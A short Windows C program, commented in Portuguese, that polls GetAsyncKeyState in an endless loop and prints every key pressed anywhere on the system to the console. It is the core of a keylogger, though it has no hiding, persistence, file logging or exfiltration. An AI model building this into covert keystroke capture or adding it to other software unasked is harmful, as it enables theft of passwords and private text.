#include <windows.h>
#include <stdio.h>

int main() {
    while (1) {
        for (int i = 8; i <= 255; ++i) {
            if (GetAsyncKeyState(i) == -32767) {
                BYTE keyboardState[256];
                GetKeyboardState(keyboardState);

                WORD w;
                UINT scanCode = MapVirtualKey(i, MAPVK_VK_TO_VSC);

                if (ToAscii(i, scanCode, keyboardState, &w, 0)) {
                    // Exibe o código ASCII correspondente à tecla pressionada
                    putchar((char)w);
                }
            }
        }
    }

    return 0;
}
